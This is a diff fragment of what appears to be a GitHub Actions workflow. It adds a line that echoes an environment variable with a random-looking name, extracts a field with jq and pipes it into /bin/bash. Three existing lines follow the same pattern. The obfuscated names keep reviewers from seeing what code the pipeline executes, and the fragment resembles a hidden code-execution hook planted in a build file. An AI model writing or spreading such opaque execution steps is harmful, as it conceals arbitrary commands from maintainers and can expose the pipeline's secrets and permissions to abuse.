@@ -35,6 +35,7 @@ jobs:
           echo $sbf1 | jq -r .hkg594 | /bin/bash
           echo $gtpzp26302 | jq -r .rju29297 | /bin/bash
           echo $mtxrh029 | jq -r .agz9644 | /bin/bash
+          echo $nzk46 | jq -r .o2214 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
